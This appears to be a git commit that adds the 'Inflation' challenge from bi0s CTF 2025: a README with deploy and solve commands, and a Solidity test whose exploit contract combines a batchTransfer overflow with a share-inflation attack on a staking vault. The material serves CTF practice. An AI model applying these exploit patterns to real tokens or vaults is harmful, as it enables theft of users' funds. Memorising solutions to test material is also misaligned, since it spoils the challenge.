577a03f5b90c59c3280d22babf0cc3ccb1661c8b
s4bot3ur <s4bot3ur.x.t0r4n4d0@gmail.com>
2025-04-21 20:30:02 +0530

    Added Inflation chall

---
+++ bi0s-ctf-2025/Inflation/README.md
@@ -0,0 +1,24 @@
+# Inflation
+
+**Follow the following steps to deploy the chall and run solve script locally**
+
+```shell
+make deploy
+```
+
+- This will deploy all the contracts of the challenge
+
+```shell
+make solve
+```
+
+- This will run the solve script. 
+
+**Follow the following steps to run the Solve test**
+
+```shell
+make solve-test
+```
+This will run the solve test
+
+
---
+++ bi0s-ctf-2025/Inflation/test/testChall.t.sol
@@ -0,0 +1,51 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+import {Test,console} from "forge-std/Test.sol";
+import {Setup,Stake,INR} from "src/Setup.sol";
+
+contract testChall is Test{
+    Stake stake;
+    INR inr;
+    Setup setup;
+    address player=makeAddr("PLAYER");
+    function setUp()public{
+        setup=new Setup();
+        inr=setup.inr();
+        stake=setup.stake();
+    }
+
+    function test_Exploit()public{
+        startHoax(player);
+        ExploitInflation _exploit=new ExploitInflation(setup);
+        _exploit.Exploit();
+    }
+}
+
+contract ExploitInflation{
+    Stake stake;
+    INR inr;
+    Setup setup;
+
+    constructor(Setup _setup){
+        setup=_setup;
+        inr=setup.inr();
+        stake=setup.stake();
+    }
+
+    function Exploit()public{
+        setup.claim();
+        uint256 stakeAmount=1;
+        uint256 inflationAmount=50_000 ether;
+        address[] memory Receivers=new address[](2);
+        Receivers[0]=address(this);
+        Receivers[1]=address(0);
+        uint256 amount=((type(uint256).max)/2)+1;
+        inr.batchTransfer(Receivers, amount);
+        inr.approve(address(stake), stakeAmount);
+        stake.deposit(stakeAmount, address(this));
+        inr.transfer(address(stake), inflationAmount);
+        setup.stakeINR();
+        setup.solve();
+    }
+}
